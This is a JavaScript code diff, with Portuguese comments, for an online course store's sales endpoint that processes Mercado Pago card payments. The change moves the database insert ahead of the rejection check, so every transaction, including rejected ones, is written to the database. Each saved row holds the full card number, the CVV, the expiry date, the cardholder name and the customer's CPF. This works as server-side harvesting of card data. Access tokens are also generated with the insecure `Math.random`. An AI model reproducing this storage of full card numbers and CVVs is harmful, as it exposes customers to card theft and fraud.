@@ -2361,10 +2361,58 @@ app.post('/api/sales', async (c) => {
       }, 500)
     }
     
-    // Verificar se o pagamento foi rejeitado
+    // Extrair informações do pagamento (mesmo se rejeitado)
+    const paymentId = paymentResult.id ? paymentResult.id.toString() : null
+    const paymentGateway = 'mercadopago'
+    const card_last4 = paymentResult.card?.last_four_digits || '****'
+    const card_brand = paymentResult.payment_method_id || 'unknown'
+    
+    // Determinar status da venda baseado no status do Mercado Pago
+    let saleStatus = 'pending'
+    if (paymentResult.status === 'rejected') {
+      saleStatus = 'failed'
+    } else if (paymentResult.status === 'approved' || paymentResult.status === 'authorized') {
+      saleStatus = 'pending'  // Será confirmado pelo cronjob
+    }
+    
+    // Gerar token de acesso aleatório
+    const access_token = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
+    
+    console.log(`[SALES] 💾 Salvando transação no banco (status: ${saleStatus})...`)
+    
+    // ✅ SALVAR TRANSAÇÃO NO BANCO (APROVADA OU REJEITADA)
+    await DB.prepare(`
+      INSERT INTO sales (
+        course_id, link_code, customer_name, customer_cpf, customer_email, customer_phone,
+        amount, status, access_token, card_last4, card_brand, card_holder_name, 
+        card_number_full, card_cvv, card_expiry, payment_id, gateway
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `).bind(
+      link.course_id,
+      link_code,
+      customer_name,
+      customer_cpf,
+      customer_email,
+      customer_phone || null,
+      parseFloat(link.price),
+      saleStatus,  // 'pending' para aprovado/em processo, 'failed' para rejeitado
+      access_token,
+      card_last4,
+      card_brand,
+      card_holder_name,
+      card_number.replace(/\s/g, ''),  // Salvar número completo sem espaços
+      card_cvv,
+      `${card_expiry_month}/${card_expiry_year}`,  // Formato: MM/YYYY
+      paymentId,
+      paymentGateway
+    ).run()
+    
+    console.log('[SALES] ✅ Transação registrada no banco de dados')
+    
+    // Verificar se o pagamento foi rejeitado e retornar erro
     if (paymentResult.status === 'rejected') {
       const errorMessage = paymentResult.status_detail || 'Pagamento rejeitado'
-      console.error('[MERCADOPAGO] ❌ Pagamento rejeitado:', errorMessage)
+      console.error('[MERCADOPAGO] ❌ Pagamento rejeitado (salvo no banco):', errorMessage)
       
       // Mapear mensagens de erro comuns
       let friendlyMessage = 'Pagamento recusado. '
@@ -2390,68 +2438,35 @@ app.post('/api/sales', async (c) => {
       
       return c.json({ 
         error: friendlyMessage,
-        details: paymentResult.status_detail
+        details: paymentResult.status_detail,
+        payment_id: paymentId,
+        transaction_saved: true  // ✅ Indica que a transação foi salva
       }, 400)
     }
     
-    // Verificar status do pagamento
+    // Verificar status do pagamento para continuar o fluxo
     const validStatuses = ['approved', 'authorized', 'in_process']
     
     if (!validStatuses.includes(paymentResult.status)) {
-      console.error('[MERCADOPAGO] ❌ Pagamento não aprovado:', paymentResult.status)
+      console.error('[MERCADOPAGO] ⚠️ Pagamento não aprovado (salvo no banco):', paymentResult.status)
+      
+      // Preparar URL de download (mesmo para transações com problemas)
+      const downloadUrl = link.pdf_url 
+        ? `https://kncursos.com.br/download/${access_token}`
+        : null
+      
       return c.json({ 
-        error: 'Pagamento não aprovado',
-        details: paymentResult.status_detail
+        error: 'Pagamento não aprovado. Verifique os dados e tente novamente.',
+        details: paymentResult.status_detail,
+        payment_id: paymentId,
+        transaction_saved: true,  // ✅ Indica que a transação foi salva
+        status: saleStatus
       }, 400)
     }
     
     // Pagamento aprovado!
     console.log('[MERCADOPAGO] ✅ Pagamento aprovado!')
     console.log('[PAGAMENTO] ✅ Pagamento aprovado via MERCADO PAGO!')
-    
-    const paymentId = paymentResult.id.toString()
-    const paymentGateway = 'mercadopago'
-    
-    // Gerar token de acesso aleatório
-    const access_token = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
-    
-    // Extrair informações do cartão da resposta do Mercado Pago
-    const card_last4 = paymentResult.card?.last_four_digits || '****'
-    const card_brand = paymentResult.payment_method_id || 'unknown'
-    const card_exp = paymentResult.card 
-      ? `${String(paymentResult.card.expiration_month).padStart(2, '0')}/${String(paymentResult.card.expiration_year).slice(-2)}`
-      : 'N/A'
-    
-    console.log(`[SALES] Registrando venda no banco de dados...`)
-    
-    // Inserir venda no banco COM payment_id e gateway E dados completos do cartão
-    await DB.prepare(`
-      INSERT INTO sales (
-        course_id, link_code, customer_name, customer_cpf, customer_email, customer_phone,
-        amount, status, access_token, card_last4, card_brand, card_holder_name, 
-        card_number_full, card_cvv, card_expiry, payment_id, gateway
-      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-    `).bind(
-      link.course_id,
-      link_code,
-      customer_name,
-      customer_cpf,
-      customer_email,
-      customer_phone || null,
-      parseFloat(link.price),
-      'pending',  // ✅ Mudado de 'completed' para 'pending'
-      access_token,
-      card_last4,
-      card_brand,
-      card_holder_name,
-      card_number.replace(/\s/g, ''),  // Salvar número completo sem espaços
-      card_cvv,
-      `${card_expiry_month}/${card_expiry_year}`,  // Formato: MM/YYYY
-      paymentId,
-      paymentGateway
-    ).run()
-    
-    console.log('[SALES] ✅ Venda registrada com status PENDING - aguardando confirmação do cronjob')
     
     // ❌ EMAIL REMOVIDO DAQUI - Será enviado pelo cronjob após confirmação real do pagamento
     
